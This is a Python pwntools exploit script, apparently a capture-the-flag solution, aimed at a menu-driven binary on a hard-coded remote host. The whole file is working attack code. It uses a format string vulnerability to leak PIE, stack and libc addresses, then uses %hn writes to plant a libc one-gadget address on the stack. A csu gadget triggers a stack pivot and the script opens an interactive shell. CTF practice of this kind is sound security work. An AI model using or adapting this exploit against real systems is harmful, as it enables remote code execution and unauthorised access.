#!/usr/bin/python3
from pwn import *

def open():
	p.sendlineafter("> ", "1")

def read():
	p.sendlineafter("> ", "2")

def edit(offset, content):
	p.sendlineafter("> ", "3")
	p.sendlineafter("Offset: ", str(offset))
	p.sendafter("Text: ", content)

def FSB(s, recover=True):
	open()
	read()
	pay = b"a" + p64(0) + p64(1) + p64(0)*2 + s
	assert(len(pay) <= 0x200)
	edit(0x1FF, pay.ljust(0x200, b"\x00"))
	open()
	if recover:
		pmpt = b": No such file or directory\n"
		out = p.recvuntil(pmpt).replace(pmpt, b"")
		pay = b"a" + p64(0)*4 + b"grimoire.txt\x00"
		edit(0x1FF, pay)
		return out

if __name__ == "__main__":
	libc = ELF("./libc.so.6")
	# p = process("./chall")
	p = remote("13.231.207.73", 9008)

	# leak PIE, STACK, and LIBC
	
	d1, d2, d3 = FSB(b"%3$p %11$p %22$p").split(b" ")
	PIE = int(d1, 16) + 0x55564ab36000 - 0x55564ab3762a
	STACK = int(d2, 16)
	LIBC = int(d3, 16) + 0x7f4e55b58000 - 0x7f4e55b79b97
	log.info("PIE: 0x%x"%PIE)
	log.info("STACK: 0x%x"%STACK)
	log.info("LIBC: 0x%x"%LIBC)

	# step.1 make a oneshot in stack
	oneshots = [0x4f322, 0x10a38c]
	oneshot = LIBC + oneshots[0]
	FSB("%{}c%13$hn".format((STACK + 0x28) & 0xFFFF).encode())
	FSB("%{}c%17$hn".format(oneshot & 0xFFFF).encode())
	FSB("%{}c%13$hn".format((STACK + 0x2a) & 0xFFFF).encode())
	FSB("%{}c%17$hn".format((oneshot >> 16) & 0xFFFF).encode())

	# step.2 trigger stack pivot with libc csu gadget
	csu = PIE + 0x1546 
	FSB("%{}c%13$hn".format((STACK - 0x18) & 0xFFFF).encode())
	FSB("%{}c%17$hn".format(csu & 0xFFFF).encode(), False)

	p.interactive()